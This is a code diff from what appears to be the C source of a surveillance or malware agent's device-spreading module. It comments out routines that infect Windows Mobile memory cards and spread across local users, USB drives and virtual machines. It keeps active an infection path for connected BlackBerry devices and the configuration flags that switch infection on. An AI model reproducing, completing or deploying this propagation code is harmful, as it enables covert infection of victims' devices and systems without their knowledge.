@@ -1168,10 +1168,10 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 #ifndef FAKE_MOBILE_INFECTION
 	LOOP {
 		char bb_path[MAX_PATH];
-		WCHAR mmc_path[MAX_PATH];
+		//WCHAR mmc_path[MAX_PATH];
 		
 		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
-		if (infection_pda && PDAFilesPresent() && RapiInit() && TryRapiConnect(3000)) {
+		/*if (infection_pda && PDAFilesPresent() && RapiInit() && TryRapiConnect(3000)) {
 			if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
 				if (InfectPDA(mmc_path)) {
 					REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
@@ -1180,7 +1180,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 			}
 			RapiDisconnect();
 			CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME*2);
-		}
+		}*/
 
 		if (infection_pda && BBFilesPresent() && HM_FindPid("Rim.Desktop.exe", FALSE)) {
 			STARTUPINFO si;
@@ -1263,16 +1263,15 @@ DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	bPM_PDAAgentStarted = bStartFlag;
 
 	if (bStartFlag) {
-		// Se voglio aggiungere Symbian lo faccio con un altro thread E UN ALTRO SEMAFORO
 		hPDAThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorPDAThread, NULL, 0, &dummy);
-		hSpreadThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewUsersThread, NULL, 0, &dummy);
+		/*hSpreadThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewUsersThread, NULL, 0, &dummy);
 		hUSBThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUSBThread, NULL, 0, &dummy);
-		hVMWThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorVMThread, NULL, 0, &dummy);
+		hVMWThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorVMThread, NULL, 0, &dummy);*/
 	} else {
 		QUERY_CANCELLATION(hPDAThread, bPM_pdacp);
-		QUERY_CANCELLATION(hSpreadThread, bPM_sprcp);
+		/*QUERY_CANCELLATION(hSpreadThread, bPM_sprcp);
 		QUERY_CANCELLATION(hUSBThread, bPM_usbcp);
-		QUERY_CANCELLATION(hVMWThread, bPM_vmwcp);
+		QUERY_CANCELLATION(hVMWThread, bPM_vmwcp);*/
 	}
 
 	return 1;
@@ -1280,18 +1279,18 @@ DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 
 DWORD __stdcall PM_PDAAgentInit(JSONObject elem)
 {
-	DWORD temp;
+	//DWORD temp;
 
-	infection_spread = (BOOL) elem[L"local"]->AsBool();
+	//infection_spread = (BOOL) elem[L"local"]->AsBool();
 	infection_pda = (BOOL) elem[L"mobile"]->AsBool();
-	infection_usb = (BOOL) elem[L"usb"]->AsBool();
+	//infection_usb = (BOOL) elem[L"usb"]->AsBool();
 
-	temp = (DWORD) elem[L"vm"]->AsNumber();
+/*	temp = (DWORD) elem[L"vm"]->AsNumber();
 	if (temp!=0) {
 		infection_vm = TRUE;
 		vm_delay = temp * 1000;
 	} else 
-		infection_vm = FALSE;
+		infection_vm = FALSE;*/
 	
 	return 1;
 }
